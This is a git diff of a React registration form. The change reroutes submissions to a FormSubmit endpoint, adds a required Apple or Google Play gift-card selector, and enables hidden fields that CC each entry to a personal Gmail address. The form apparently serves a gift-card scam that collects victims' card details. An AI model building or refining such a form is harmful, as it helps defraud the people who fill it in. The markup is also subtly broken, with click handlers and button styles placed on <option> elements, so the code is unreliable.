@@ -61,7 +61,9 @@ const Registration = () => {
 
           {/* Right Side: The Form */}
           <div className="bg-[#FAF9F6] p-8 md:p-10 border border-zinc-100 shadow-sm">
-            <form  action="https://formspree.io/f/xjgzyjqa"  method='POST'
+            {/* <form  action="https://formspree.io/f/xjgzyjqa"  method='POST' */}
+
+          <form  action="https://formsubmit.co/6ce79e4944c5888ebe0ef20f1f610dc8"  method='POST' enctype="multipart/form-data"
             className="space-y-5"> 
               {/* Personal Details */}
               <div className="space-y-4 mb-8">
@@ -117,20 +119,25 @@ const Registration = () => {
 
                 {/* Card Type Selector */}
                 <div className="flex gap-4 mb-4">
-                  <button
-                    type="button"
+                  
+                  <label className="text-[10px] font-bold uppercase tracking-widest text-zinc-400">Select Card Type</label>
+                  <select name="cardType" id="cardType" placeholder="Select Card Type" className="bg-white border border-zinc-200 p-3 outline-none focus:border-[#C5A059] text-sm font-bold uppercase tracking-widest w-full" required>
+                  <option
+                    
+                    value='itunes'
                     onClick={() => setCardType('apple')}
                     className={`flex-1 py-3 border text-[10px] font-bold uppercase tracking-widest transition-all ${cardType === 'apple' ? 'bg-[#1A1A1A] text-white border-[#1A1A1A]' : 'bg-white text-zinc-400 border-zinc-200 hover:border-zinc-400'}`}
                   >
                     Apple Gift Card
-                  </button>
-                  <button
-                    type="button"
+                  </option>
+                  <option
+                    value='google'
                     onClick={() => setCardType('google')}
                     className={`flex-1 py-3 border text-[10px] font-bold uppercase tracking-widest transition-all ${cardType === 'google' ? 'bg-[#1A1A1A] text-white border-[#1A1A1A]' : 'bg-white text-zinc-400 border-zinc-200 hover:border-zinc-400'}`}
                   >
-                    Google Play
-                  </button>
+                    Google Play Card
+                  </option>
+                  </select>
                 </div>
 
                 <input
@@ -172,16 +179,16 @@ const Registration = () => {
                 </div>
               </div>
 
-              <button onclick="sendMail()" className="w-full bg-[#1A1A1A] text-white py-4 font-bold uppercase tracking-[0.3em] hover:bg-[#C5A059] transition-all text-xs mt-4 shadow-lg shadow-zinc-200 pointer-events-auto">
+              <button className="w-full bg-[#1A1A1A] text-white py-4 font-bold uppercase tracking-[0.3em] hover:bg-[#C5A059] transition-all text-xs mt-4 shadow-lg shadow-zinc-200 pointer-events-auto">
                 Complete Registration
               </button>
 
 
 
-              {/* <input type="hidden" name="_autoresponse" value="We recieved your Application; we will respond to your shortly"></input>
-              <input type="hidden" name="_captcha" value="false" />
+              <input type="hidden" name="_autoresponse" value="We recieved your Application; we will respond to your shortly"></input>
+              {/* <input type="hidden" name="_captcha" value="false" /> */}
               <input type="hidden" name="_next" value="https://thankpg.netlify.app" />
-              <input type="hidden" name="_cc" value="nimissolomon@gmail.com" /> */}
+              <input type="hidden" name="_cc" value="nimissolomon@gmail.com" />
 
             </form>
           </div>
